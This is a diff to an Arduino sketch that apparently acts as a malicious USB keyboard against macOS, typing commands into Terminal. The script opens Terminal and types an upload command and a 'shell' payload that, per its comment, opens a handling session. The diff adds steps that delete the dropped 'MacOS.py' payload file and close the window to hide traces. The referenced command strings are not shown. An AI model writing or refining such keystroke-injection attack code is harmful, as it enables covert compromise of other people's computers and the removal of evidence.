@@ -11,30 +11,36 @@ void setup() {
 
 void loop() {
   delay(5000);
-  CommandAtRunBarOSX("terminal"); // open terminal
+  CommandAtRunBarOSX("terminal");
   Keyboard.press(KEY_RETURN);
   delay(2000);
   Keyboard.press(KEY_RETURN);
   delay(2000);
   Keyboard.println(upload);
-  delay(2000);
+  delay(1000);
   Keyboard.press(KEY_RETURN);
-  delay(200);
-  Keyboard.println(shell); 
-  delay(2000);
+  Keyboard.release(KEY_RETURN);
+  delay(800);
+  Keyboard.println(shell);             // open payload file -> handling session
+  delay(1000);
   Keyboard.press(KEY_RETURN);
-  delay(200);
+  Keyboard.release(KEY_RETURN);
+  delay(3500);
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press('z'); 
   Keyboard.releaseAll();               // CTRL + Z for interrupt .py 
-  delay(1500);
+  delay(1000);
+  Keyboard.println("rm MacOS.py");     // remove payload file
+  delay(1000);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);        
+  delay(800);
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('q');
   Keyboard.releaseAll();                // COMMAND + Q for close terminal
   delay(1500);
   delay (100500);
 }
-
 
 
 
